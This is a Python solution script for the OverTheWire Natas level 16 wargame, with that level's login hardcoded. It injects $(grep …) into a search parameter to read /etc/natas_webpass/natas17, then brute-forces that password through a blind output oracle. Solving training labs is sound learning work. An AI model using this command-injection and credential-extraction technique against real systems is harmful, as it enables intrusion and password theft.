import requests
from requests.auth import HTTPBasicAuth
import string
import multiprocessing
import threading
import time
import bs4


possibilities = list(string.ascii_letters + string.digits)


class Requester:
    def send_request(self, password):
        while True:
            try:
                result = requests.post(url=f'http://natas16.natas.labs.overthewire.org?needle=$(grep {password} /etc/natas_webpass/natas17)igloo', auth=HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'))
                return result.content.decode(), password
            except Exception as e:
                print(e)

    
    def filter_results(self, value):
        value, password = value
        souper = bs4.BeautifulSoup(value, "html.parser")
        parsed_result = str(souper.pre)
        parsed_result = parsed_result.replace("\n", "")
        if parsed_result == "<pre></pre>":
            return True
        return False
    

class RetrieveCharacters(Requester):    
    def get_chars(self):
        verified_characters = []
        for character in possibilities:
            result, password = self.send_request(character)
            parsed_result = self.filter_results(result)
            if parsed_result:
                print(f"VERIFIED: {character}")
                verified_characters.append(character)
        return verified_characters
            

class PasswordBruteForce(Requester):
    def __init__(self, char_list):
        self.char_list = char_list
        self.dynamic_char_list = char_list

    def brute_root_char(self, password):
        combinations = [password+character for character in self.dynamic_char_list if len(password+character) <= 32]
        with multiprocessing.Pool(3) as pool:
            mapped_values = pool.map(self.send_request, combinations)
        filtered_values = filter(self.filter_results, mapped_values)
        for html, sub_password in filtered_values:
            print(f"VERIFIED: {sub_password}")
            password_route = self.brute_root_char(sub_password)
            if len(password_route) == 32:
                self.dynamic_char_list.insert(0, password_route)
                return password_route
        return ""
    
    def thread_pool_start(self):
        results = []
        for character in self.char_list:
            results.append(self.brute_root_char(character))
        return results


if __name__ == "__main__":
    start = time.time()
    #char_getter = RetrieveCharacters()
    #chars = char_getter.get_chars()
    #print(chars)
    print(PasswordBruteForce(['b', 'd', 'h', 'k', 'm', 'n', 's', 'u', 'v', 'B', 'C', 'E', 'H', 'I', 'K', 'L', 'R', 'S', 'U', 'X', '0', '1', '7', '9']).thread_pool_start())
    print(f"took {time.time()-start}")